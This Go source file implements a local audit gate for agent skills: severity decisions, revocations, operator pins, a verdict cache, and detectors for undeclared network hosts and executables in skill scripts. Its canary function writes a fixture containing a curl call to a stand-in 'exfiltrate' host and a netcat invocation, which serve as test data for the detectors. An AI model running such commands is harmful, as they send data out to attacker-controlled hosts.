// Package audit implements the machine-local audit gate (Spec §12): the
// decision semantics, local revocations, operator pins, a blocking canary,
// a small deterministic detector set, and a verdict cache.
//
// Detectors MAY differ between implementations; the decision semantics of
// Spec §12.2 hold whenever audit is enabled.
package audit

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"

	"github.com/relux-works/curator/internal/capabilities"
	"github.com/relux-works/curator/internal/config"
	"github.com/relux-works/curator/internal/hashing"
	"github.com/relux-works/curator/internal/opaquescan"
	"github.com/relux-works/curator/internal/scriptpolicy"
	"github.com/relux-works/curator/internal/skillspec"
)

// Severities and decisions (Spec §12.1, §12.2).
const (
	SeverityInfo     = "info"
	SeverityLow      = "low"
	SeverityMedium   = "medium"
	SeverityHigh     = "high"
	SeverityCritical = "critical"

	DecisionAllow      = "allow"
	DecisionWarn       = "warn"
	DecisionBlock      = "block"
	DecisionRequirePin = "require_pin"
)

var severityRank = map[string]int{
	SeverityInfo: 0, SeverityLow: 1, SeverityMedium: 2, SeverityHigh: 3, SeverityCritical: 4,
}

// PromptVersion and RulesetVersion key the verdict cache together with the
// backend and model (Spec §12.1).
const (
	PromptVersion  = "1"
	RulesetVersion = "2"
)

const findingOpaqueNUL = "audit.opaque.nul-byte"

// Finding is one audit finding.
type Finding struct {
	ID         string `json:"id"`
	Severity   string `json:"severity"`
	File       string `json:"file,omitempty"`
	Evidence   string `json:"evidence"`
	Verifiable bool   `json:"verifiable"`
}

// Subject is one skill under audit.
type Subject struct {
	Name          string
	Source        string
	Git           string
	Commit        string
	Snapshot      string
	SchemaVersion int
	Capabilities  capabilities.Manifest
	// Commands carries the skill's parsed commands for the script audit
	// warning classes (manager profile §7). A nil map labels nothing,
	// so callers without a parsed manifest keep the previous output.
	Commands map[string]skillspec.Command
}

// Report is the audit outcome for one subject.
type Report struct {
	Skill         string
	ContentSHA256 string
	Findings      []Finding
	Decision      string
	Revoked       bool
	Revocation    string
	CacheHit      bool
	// ScriptPolicies is the per-command execution-policy record
	// (manager profile §7): every script command's effective policy
	// identity or its explicit absence, independent of warning
	// eligibility. It is computed fresh from the subject on every
	// path, including cache hits, and persisted with the verdict.
	ScriptPolicies []scriptpolicy.CommandAuditPolicy
}

// ScriptPolicyRecord is one entry of the production audit record: the
// skill, the script command, and its effective execution-policy identity
// or its explicit absence (an empty policy).
type ScriptPolicyRecord struct {
	Skill   string `json:"skill"`
	Command string `json:"command"`
	Policy  string `json:"policy"`
}

// ScriptPolicyRecords reports the per-command execution-policy record for
// every subject in order. Commands without a warning keep their entry:
// warning eligibility never drops a record entry.
func ScriptPolicyRecords(subjects []Subject) []ScriptPolicyRecord {
	var records []ScriptPolicyRecord
	for _, subject := range subjects {
		for _, entry := range scriptpolicy.AuditPoliciesForCommands(subject.Commands) {
			records = append(records, ScriptPolicyRecord{
				Skill: subject.Name, Command: entry.Command, Policy: entry.Policy,
			})
		}
	}
	return records
}

// FormatScriptPolicy renders one audit-record entry for terminal output.
// It is informational, never a warning: absence renders as an explicit
// `(none)` so a reviewer can separate enforced commands from
// declared-only ones on the line itself.
func FormatScriptPolicy(record ScriptPolicyRecord) string {
	policy := record.Policy
	if policy == "" {
		policy = "(none)"
	}
	return fmt.Sprintf("audit info: %s: command '%s' execution_policy=%s",
		record.Skill, record.Command, policy)
}

// Decide implements Spec §12.2 over findings.
func Decide(findings []Finding, mode, failOn string) string {
	if len(findings) == 0 {
		return DecisionAllow
	}
	if mode != "strict" || failOn == "off" {
		return DecisionWarn
	}
	threshold, known := severityRank[failOn]
	if !known {
		threshold = severityRank[SeverityHigh]
	}
	for _, finding := range findings {
		if finding.Verifiable && severityRank[finding.Severity] >= threshold {
			return DecisionBlock
		}
	}
	return DecisionWarn
}

// Gate audits every subject and returns warnings and blocking errors per the
// gate behavior of Spec §12.2. Opaque NUL files block even when optional audit
// is disabled, because the v1 content hash cannot distinguish their tree from
// a colliding twin.
func Gate(cfg *config.Config, subjects []Subject) (warnings []string, errs []string) {
	return gate(cfg, subjects, true)
}

// GateReadOnly applies the same decisions while leaving the verdict cache and
// trust state unchanged. It is used for dry-run planning.
func GateReadOnly(cfg *config.Config, subjects []Subject) (warnings []string, errs []string) {
	return gate(cfg, subjects, false)
}

func gate(cfg *config.Config, subjects []Subject, persist bool) (warnings []string, errs []string) {
	// NUL-bearing files are opaque under the current v1 content framing, so
	// this refusal is independent of the opt-in audit policy. Scan every
	// admitted snapshot before the audit-enabled early return.
	opaquePaths := make([][]string, len(subjects))
	skipAudit := make([]bool, len(subjects))
	for index, subject := range subjects {
		paths, err := opaquescan.NULPaths(subject.Snapshot)
		if err != nil {
			skipAudit[index] = true
			errs = append(errs, fmt.Sprintf("audit blocked: %s: opaque snapshot scan: %v", subject.Name, err))
			continue
		}
		opaquePaths[index] = paths
		if len(paths) == 0 {
			continue
		}
		skipAudit[index] = true
		report := opaqueNULReport(paths)
		switch report.Decision {
		case DecisionBlock:
			for _, finding := range report.Findings {
				errs = append(errs, auditFindingMessage("audit blocked", subject.Name, finding))
			}
		case DecisionWarn:
			for _, finding := range report.Findings {
				warnings = append(warnings, auditFindingMessage("audit warning", subject.Name, finding))
			}
		}
	}
	if !cfg.Audit.Enabled {
		return warnings, errs
	}
	if !runStaticCanary() {
		return warnings, append(errs, "audit blocked: audit canary failed: detectors are not producing expected findings")
	}
	for index, subject := range subjects {
		if skipAudit[index] {
			continue
		}
		report, err := auditSubjectWithOpaquePaths(cfg, subject, persist, opaquePaths[index])
		if err != nil {
			errs = append(errs, fmt.Sprintf("audit blocked: %s: %v", subject.Name, err))
			continue
		}
		// Script audit labels are not findings: they are always warnings
		// in every mode, never block, and are never subject to `fail_on`,
		// so they join the warnings on every decision, including allow
		// and block. They are computed fresh per subject, never cached
		// with the verdict findings.
		scriptWarnings := scriptAuditWarnings(subject)
		switch report.Decision {
		case DecisionAllow:
			warnings = append(warnings, scriptWarnings...)
		case DecisionRequirePin:
			errs = append(errs, fmt.Sprintf(
				"audit requires pin: %s: schema v%d has no capabilities; migrate to agent-skill.json schema v3 or pin the content hash %s with a reason",
				subject.Name, subject.SchemaVersion, report.ContentSHA256))
			warnings = append(warnings, scriptWarnings...)
		case DecisionBlock:
			if report.Revoked {
				errs = append(errs, fmt.Sprintf("audit blocked: %s: %s is revoked", subject.Name, report.Revocation))
				warnings = append(warnings, scriptWarnings...)
				continue
			}
			for _, finding := range report.Findings {
				errs = append(errs, auditFindingMessage("audit blocked", subject.Name, finding))
			}
			warnings = append(warnings, scriptWarnings...)
		default: // warn
			for _, finding := range report.Findings {
				warnings = append(warnings, auditFindingMessage("audit warning", subject.Name, finding))
			}
			warnings = append(warnings, scriptWarnings...)
		}
	}
	return warnings, errs
}

// scriptAuditWarnings renders the script warning classes of one subject
// (manager profile §7) as audit warnings. The label text is the closed
// class name, pinned exactly as the conformance vector names it; the
// evidence names the command and the operator action.
func scriptAuditWarnings(subject Subject) []string {
	labelled := scriptpolicy.AuditLabelsForCommands(subject.Commands, subject.Capabilities.Network)
	var warnings []string
	for _, entry := range labelled {
		for _, label := range entry.Labels {
			var evidence string
			switch label {
			case scriptpolicy.LabelDeclaredOnly:
				evidence = fmt.Sprintf("command '%s' is declared-only (no execution_policy); its capabilities bound nothing at run time; adopt execution_policy %q with an interpreter to enforce containment",
					entry.Command, skillspec.ScriptExecutionPolicy)
			case scriptpolicy.LabelUnfilteredDeclaredNetwork:
				evidence = fmt.Sprintf("command '%s' is enforced but its declared network hosts are reporting-only (no portable filtering is applied); declare only the hosts you need",
					entry.Command)
			default:
				evidence = fmt.Sprintf("command '%s' carries %s", entry.Command, label)
			}
			warnings = append(warnings, fmt.Sprintf("audit warning: %s: %s %s - %s",
				subject.Name, SeverityLow, label, evidence))
		}
	}
	return warnings
}

// auditSubject runs the pipeline of Spec §12.1 for one subject.
func auditSubject(cfg *config.Config, subject Subject, persist bool) (Report, error) {
	opaquePaths, err := opaquescan.NULPaths(subject.Snapshot)
	if err != nil {
		return Report{}, fmt.Errorf("opaque snapshot scan: %w", err)
	}
	return auditSubjectWithOpaquePaths(cfg, subject, persist, opaquePaths)
}

func auditSubjectWithOpaquePaths(cfg *config.Config, subject Subject, persist bool, opaquePaths []string) (Report, error) {
	contentHash, err := hashing.ContentSHA256(subject.Snapshot, nil)
	if err != nil {
		return Report{}, err
	}
	report := Report{
		Skill: subject.Name, ContentSHA256: contentHash,
		ScriptPolicies: scriptpolicy.AuditPoliciesForCommands(subject.Commands),
	}
	// The v1 content hash can collide when file bytes contain NUL. Keep this
	// result outside the verdict cache so a NUL-free twin cannot authorize a
	// NUL-bearing tree with the same hash.
	opaqueReport := opaqueNULReport(opaquePaths)
	if opaqueReport.Decision == DecisionBlock {
		report.Findings = opaqueReport.Findings
		report.Decision = opaqueReport.Decision
		return report, nil
	}

	// Local revocations block unconditionally (Spec §12.2).
	if reason := revocationReason(cfg, contentHash, subject.Source, subject.Git); reason != "" {
		report.Revoked = true
		report.Revocation = reason
		report.Decision = DecisionBlock
		return report, nil
	}

	// Verdict cache: findings cached by content hash, backend, model, and
	// versions; the decision is recomputed under the current policy.
	if findings, hit := loadCachedFindings(cfg, contentHash); hit {
		report.CacheHit = true
		report.Findings = findings
		report.Decision = decideWithPins(cfg, subject, contentHash, findings)
		if persist {
			backfillScriptPolicies(cfg, contentHash, subject, findings, report.ScriptPolicies)
		}
		return report, nil
	}

	findings := detectWithOpaquePaths(subject.Snapshot, subject.Capabilities, opaquePaths)
	if persist {
		storeCachedFindings(cfg, contentHash, subject, findings, report.ScriptPolicies)
	}
	report.Findings = findings
	report.Decision = decideWithPins(cfg, subject, contentHash, findings)
	return report, nil
}

func decideWithPins(cfg *config.Config, subject Subject, contentHash string, findings []Finding) string {
	pinned := isPinned(cfg, contentHash)
	if cfg.Audit.Mode == "strict" && subject.SchemaVersion < 3 && !pinned {
		return DecisionRequirePin
	}
	if pinned {
		return DecisionAllow
	}
	return Decide(findings, cfg.Audit.Mode, cfg.Audit.FailOn)
}

// revocationReason matches audit.revocations: content hashes or
// source:<glob> patterns over the source, the git URL, and the identity-ish
// normalized form (Spec §12.2).
func revocationReason(cfg *config.Config, contentHash, source, git string) string {
	return RevocationFor(cfg.Audit.Revocations, contentHash, source, git)
}

// RevocationFor matches a revocation list against a content hash and source
// identities. The profile path (environments §9.1) calls this regardless of
// cfg.Audit.Enabled: revocation always blocks, even when the skill pipeline
// runs advisory. Candidates are the canonical identity, the raw clone URL,
// and (for path packages) the state hash carried as source.
func RevocationFor(revocations []string, contentHash, source, git string) string {
	normalized := hashing.Normalize(contentHash)
	for _, item := range revocations {
		if strings.HasPrefix(item, "source:") {
			pattern := strings.TrimPrefix(item, "source:")
			for _, candidate := range []string{source, git} {
				if candidate == "" {
					continue
				}
				if matched, _ := filepath.Match(pattern, candidate); matched {
					return "source " + pattern
				}
			}
			continue
		}
		if hashing.Normalize(item) == normalized {
			return "content hash " + contentHash
		}
	}
	return ""
}

// CanaryPasses reports whether the static detector canary fires. The profile
// path calls this regardless of cfg.Audit.Enabled: a failing canary always
// blocks profile installation (environments §9.1).
func CanaryPasses() bool { return runStaticCanary() }

// Pin records operator trust for a content hash with a reason (Spec §12.2).
func Pin(home, contentHash, reason, pinnedBy string) (string, error) {
	dir := trustDir(home, contentHash)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", err
	}
	payload, err := json.MarshalIndent(map[string]any{
		"schema_version": 1,
		"content_sha256": strings.ToLower(contentHash),
		"pinned":         true,
		"pinned_by":      pinnedBy,
		"reason":         reason,
	}, "", "  ")
	if err != nil {
		return "", err
	}
	path := filepath.Join(dir, "trust.json")
	return path, os.WriteFile(path, append(payload, '\n'), 0o644)
}

func isPinned(cfg *config.Config, contentHash string) bool {
	payload, err := os.ReadFile(filepath.Join(trustDir(cfg.Home(), contentHash), "trust.json")) // #nosec G304
	if err != nil {
		return false
	}
	var data struct {
		Pinned bool `json:"pinned"`
	}
	return json.Unmarshal(payload, &data) == nil && data.Pinned
}

func trustDir(home, contentHash string) string {
	return filepath.Join(home, "audit", hashing.Normalize(contentHash))
}

func verdictPath(cfg *config.Config, contentHash string) string {
	key := strings.Join([]string{cfg.Audit.Backend, cfg.Audit.Model, PromptVersion, RulesetVersion}, "-")
	return filepath.Join(trustDir(cfg.Home(), contentHash), "verdict-"+key+".json")
}

func loadCachedFindings(cfg *config.Config, contentHash string) ([]Finding, bool) {
	payload, err := os.ReadFile(verdictPath(cfg, contentHash)) // #nosec G304
	if err != nil {
		return nil, false
	}
	var data struct {
		Findings []Finding `json:"findings"`
	}
	if err := json.Unmarshal(payload, &data); err != nil {
		return nil, false
	}
	return data.Findings, true
}

// backfillScriptPolicies refreshes a cached verdict that predates the
// per-command policy record (manager profile §7). Verdicts written before
// the record existed carry no `script_policies` member; the first writable
// audit rewrites the stored file with the cached findings unchanged and the
// current per-command entries, so the file ends up as a fresh audit would
// have written it. Verdicts that already record policies are left
// untouched, so a subject without parsed commands never clobbers a stored
// record; read-only callers never reach this path and never write.
func backfillScriptPolicies(cfg *config.Config, contentHash string, subject Subject, findings []Finding, policies []scriptpolicy.CommandAuditPolicy) {
	if verdictHasScriptPolicies(cfg, contentHash) {
		return
	}
	storeCachedFindings(cfg, contentHash, subject, findings, policies)
}

// verdictHasScriptPolicies reports whether the stored verdict already
// records the per-command entries. A missing member and an explicit null
// both count as absent: null is the fresh-path encoding of "no script
// commands", so a later subject that carries commands still backfills.
func verdictHasScriptPolicies(cfg *config.Config, contentHash string) bool {
	payload, err := os.ReadFile(verdictPath(cfg, contentHash)) // #nosec G304
	if err != nil {
		return false
	}
	var data struct {
		ScriptPolicies *[]scriptpolicy.CommandAuditPolicy `json:"script_policies"`
	}
	if err := json.Unmarshal(payload, &data); err != nil {
		return false
	}
	return data.ScriptPolicies != nil
}

func storeCachedFindings(cfg *config.Config, contentHash string, subject Subject, findings []Finding, policies []scriptpolicy.CommandAuditPolicy) {
	dir := trustDir(cfg.Home(), contentHash)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return
	}
	payload, err := json.MarshalIndent(map[string]any{
		"schema_version":  1,
		"content_sha256":  strings.ToLower(contentHash),
		"skill":           subject.Name,
		"commit":          subject.Commit,
		"backend":         cfg.Audit.Backend,
		"model":           cfg.Audit.Model,
		"prompt_version":  PromptVersion,
		"ruleset_version": RulesetVersion,
		"findings":        findings,
		"script_policies": policies,
	}, "", "  ")
	if err != nil {
		return
	}
	_ = os.WriteFile(verdictPath(cfg, contentHash), append(payload, '\n'), 0o644)
}

// Deterministic detectors: observed behavior vs declared capabilities.
var (
	urlRE  = regexp.MustCompile(`https?://([A-Za-z0-9.-]+)`)
	execRE = regexp.MustCompile(`(?m)(?:subprocess|exec\.Command|os\.system|shutil\.which)\(\s*["']([A-Za-z0-9._-]+)["']`)
)

func detect(snapshot string, caps capabilities.Manifest) []Finding {
	opaquePaths, err := opaquescan.NULPaths(snapshot)
	if err != nil {
		return []Finding{{
			ID: "audit.opaque.scan-incomplete", Severity: SeverityCritical,
			Evidence:   fmt.Sprintf("cannot establish whether the snapshot contains NUL bytes: %v", err),
			Verifiable: true,
		}}
	}
	return detectWithOpaquePaths(snapshot, caps, opaquePaths)
}

func detectWithOpaquePaths(snapshot string, caps capabilities.Manifest, opaquePaths []string) []Finding {
	findings := opaqueNULFindings(opaquePaths)
	declaredHosts := map[string]bool{}
	for _, host := range caps.Network {
		declaredHosts[strings.ToLower(host)] = true
	}
	declaredExec := map[string]bool{}
	for _, name := range caps.Exec {
		declaredExec[name] = true
	}
	manifestName := "agent-skill.json"
	if _, err := os.Stat(filepath.Join(snapshot, manifestName)); os.IsNotExist(err) {
		manifestName = "csk-skill.json"
	}

	_ = filepath.WalkDir(snapshot, func(path string, entry os.DirEntry, err error) error {
		if err != nil || entry.IsDir() {
			return nil
		}
		rel, relErr := filepath.Rel(snapshot, path)
		if relErr != nil {
			return nil
		}
		posix := filepath.ToSlash(rel)
		if !strings.HasPrefix(posix, "scripts/") && posix != manifestName {
			return nil
		}
		payload, readErr := os.ReadFile(path) // #nosec G304 -- walked snapshot
		if readErr != nil {
			return nil
		}
		text := string(payload)
		for _, match := range urlRE.FindAllStringSubmatch(text, -1) {
			host := strings.ToLower(match[1])
			if host == "localhost" || host == "127.0.0.1" || declaredHost(declaredHosts, host) {
				continue
			}
			findings = append(findings, Finding{
				ID: "audit.capability.network-undeclared", Severity: SeverityHigh,
				File: posix, Evidence: fmt.Sprintf("contacts %s, which no capabilities.network entry covers", host),
				Verifiable: true,
			})
		}
		for _, match := range execRE.FindAllStringSubmatch(text, -1) {
			binary := match[1]
			if declaredExec[binary] {
				continue
			}
			findings = append(findings, Finding{
				ID: "audit.capability.exec-undeclared", Severity: SeverityMedium,
				File: posix, Evidence: fmt.Sprintf("executes %q, which capabilities.exec does not declare", binary),
				Verifiable: true,
			})
		}
		return nil
	})
	sort.Slice(findings, func(i, j int) bool {
		if findings[i].File != findings[j].File {
			return findings[i].File < findings[j].File
		}
		return findings[i].Evidence < findings[j].Evidence
	})
	return findings
}

func opaqueNULFindings(paths []string) []Finding {
	findings := make([]Finding, 0, len(paths))
	for _, path := range paths {
		findings = append(findings, Finding{
			ID: findingOpaqueNUL, Severity: SeverityCritical, File: path,
			Evidence:   "regular file contains a NUL byte and is treated as opaque",
			Verifiable: true,
		})
	}
	return findings
}

func opaqueNULReport(paths []string) Report {
	findings := opaqueNULFindings(paths)
	decision := DecisionAllow
	if len(findings) != 0 {
		decision = DecisionBlock
	}
	return Report{Findings: findings, Decision: decision}
}

func auditFindingMessage(prefix, subject string, finding Finding) string {
	message := fmt.Sprintf("%s: %s: %s %s - %s", prefix, subject, finding.Severity, finding.ID, finding.Evidence)
	if finding.File != "" {
		message += fmt.Sprintf(" (file: %s)", finding.File)
	}
	return message
}

func declaredHost(declared map[string]bool, host string) bool {
	if declared[host] {
		return true
	}
	for pattern := range declared {
		if matched, _ := filepath.Match(pattern, host); matched {
			return true
		}
	}
	return false
}

// runStaticCanary plants a known-bad fixture and checks the detectors fire
// (Spec §12.1): a failing canary blocks the audit entirely.
func runStaticCanary() bool {
	dir, err := os.MkdirTemp("", "curator-canary-")
	if err != nil {
		return false
	}
	defer func() { _ = os.RemoveAll(dir) }()
	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0o755); err != nil {
		return false
	}
	payload := "curl https://exfiltrate.example.com/data\nsubprocess(\"nc\")\n"
	if err := os.WriteFile(filepath.Join(dir, "scripts", "bad"), []byte(payload), 0o644); err != nil {
		return false
	}
	findings := detect(dir, capabilities.ImplicitNone())
	foundNetwork, foundExec := false, false
	for _, finding := range findings {
		if finding.ID == "audit.capability.network-undeclared" {
			foundNetwork = true
		}
		if finding.ID == "audit.capability.exec-undeclared" {
			foundExec = true
		}
	}
	return foundNetwork && foundExec
}
